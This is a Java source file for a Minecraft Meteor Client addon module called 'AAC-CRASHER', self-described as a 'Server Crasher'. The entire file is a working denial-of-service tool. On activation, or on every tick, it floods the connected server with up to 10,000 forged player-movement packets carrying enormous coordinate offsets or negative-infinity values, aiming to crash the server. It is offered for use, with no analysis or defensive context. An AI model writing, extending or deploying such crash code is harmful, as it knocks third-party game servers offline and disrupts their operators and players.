package com.example.addon.modules;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class AACCRASHER extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
    private final Setting<Modes> crash = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("Which Crash mode to use.")
        .defaultValue(Modes.NEW)
        .build()
    );
    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server.")
        .defaultValue(5000)
        .sliderRange(100, 10000)
        .build());

    private final Setting<Boolean> onTick = sgGeneral.add(new BoolSetting.Builder()
        .name("on-tick")
        .description("Sends the packets every tick.")
        .defaultValue(false)
        .build());
    @Override
    public void onActivate() {
        if (Utils.canUpdate() && !onTick.get()) {
            switch (crash.get()) {
                case NEW -> {
                    for (double i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(
                            new PlayerMoveC2SPacket.PositionAndOnGround(
                                mc.player.getX() + (9412 * i),
                                mc.player.getY() + (9412 * i),
                                mc.player.getZ() + (9412 * i),
                                true,   // onGround
                                false   // someFlag
                            )
                        );
                    }
                }
                case OTHER -> {
                    for (double i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(
                            new PlayerMoveC2SPacket.PositionAndOnGround(
                                mc.player.getX() + (500000 * i),
                                mc.player.getY() + (500000 * i),
                                mc.player.getZ() + (500000 * i),
                                true,
                                false
                            )
                        );
                    }
                }
                case OLD -> mc.getNetworkHandler().sendPacket(
                    new PlayerMoveC2SPacket.PositionAndOnGround(
                        Double.NEGATIVE_INFINITY,
                        Double.NEGATIVE_INFINITY,
                        Double.NEGATIVE_INFINITY,
                        true,
                        false
                    )
                );
            }
        }
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        if (onTick.get()) {
            switch (crash.get()) {
                case NEW -> {
                    for (double i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(
                            new PlayerMoveC2SPacket.PositionAndOnGround(
                                mc.player.getX() + (9412 * i),
                                mc.player.getY() + (9412 * i),
                                mc.player.getZ() + (9412 * i),
                                true,   // onGround
                                false   // someFlag
                            )
                        );
                    }
                }
                case OTHER -> {
                    for (double i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(
                            new PlayerMoveC2SPacket.PositionAndOnGround(
                                mc.player.getX() + (500000 * i),
                                mc.player.getY() + (500000 * i),
                                mc.player.getZ() + (500000 * i),
                                true,
                                false
                            )
                        );
                    }
                }
                case OLD -> {
                    for (double i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(
                            new PlayerMoveC2SPacket.PositionAndOnGround(
                                Double.NEGATIVE_INFINITY,
                                Double.NEGATIVE_INFINITY,
                                Double.NEGATIVE_INFINITY,
                                true,
                                false
                            )
                        );
                    }
                }
            }
        }
    }

    public enum Modes {
        NEW,
        OTHER,
        OLD
    }
    /**
     * The {@code name} parameter should be in kebab-case.
     */
    public AACCRASHER() {
        super(AddonTemplate.CATEGORY, "AAC-CRASHER", "Server Crasher LOL.");
    }
    @EventHandler
    private void onWorldChange(GameLeftEvent event) {
        if (this.isActive()) if (this.isActive()) this.toggle();
    }

}
